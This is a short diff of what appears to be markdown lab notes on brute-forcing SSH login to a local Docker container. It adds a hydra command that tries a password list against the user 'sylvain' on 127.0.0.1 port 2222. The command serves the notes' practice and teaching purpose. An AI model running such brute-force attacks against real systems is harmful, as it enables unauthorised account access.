@@ -57,10 +57,7 @@ ralex@ralex-nb:~$
 
 brute force docker with hydra
 
-```bash
-ssh sylvain@localhost -p 2222
-hydra 
-```
+``hydra -l sylvain -P passlist.txt ssh://127.0.0.1:2222``
 
 ```bash
 ralex@ralex-nb:~$ hydra -l sylvain -P passlist.txt ssh://127.0.0.1:2222
